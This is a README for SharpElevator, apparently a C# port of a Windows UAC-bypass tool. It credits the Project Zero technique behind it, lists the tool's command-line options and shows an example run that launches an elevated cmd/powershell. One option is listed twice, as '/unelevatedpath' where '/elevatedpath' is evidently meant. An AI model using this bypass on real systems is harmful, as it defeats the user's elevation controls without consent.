# Sharp Elevator

SharpElevator is a C# implementation of [Elevator](https://github.com/Kudaes/Elevator) by Kurosh Dabbagh Escalante for UAC bypass.

This UAC bypass was originally discovered by James Forshaw [(@tiraniddo)](https://twitter.com/tiraniddo) and published in his brilliant post at:
[https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html](https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html)

## Usage
  SharpElevator.exe [/command:<command to execute>] [/arguments:<command line arguments>] 
                           [/unelevatedpath:<path>] [/elevatedpath:<path>] [/nowindow] [/newconsole]

### Arguments
    [/command:<command to execute>]        Sets the command to executed in an elevated contex. 
                                           Defaults to cmd.exe.

    [/arguments:<command line arguments>]  Sets the command line arguments.
                                           Defaults to blank.

    [/unelevatedpath:<path>]               Sets the path of a sacrificial program to launch in an unelevated context.
                                           Defaults to C:\Windows\System32\notepad.exe

    [/unelevatedpath:<path>]               Sets the path of a sacrificial auto-elevated program.
                                           Defaults to C:\Windows\System32\taskmgr.exe

    [/nowindow]                            Sets the NoWindow flag for the new process.
                                           Defaults to false.

    [/newconsole]                          Sets the NewConsole flag for the new process.
                                           Defaults to false.

### Example

```
    ..>SharpElevator.exe /command:cmd.exe /arguments:"/ c powershell.exe" /newconsole

        [+] Unelevatad process created(C:\Windows\System32\notepad.exe)
        [+] Reference to debug object obtained
        [+] Terminated unelevated process
        [+] Detached debug object from unelevetad process
        [+] Elevatad process created(C:\Windows\System32\taskmgr.exe)
        [+] Initial process creation debug event retrieved
        [+] Obtained full access handle to elevated process
        [+] Terminated elevated process
        [+] Detached debug object from elevetad process
        [+] WOOT! Created elevated process cmd.exe /c powershell.exe
```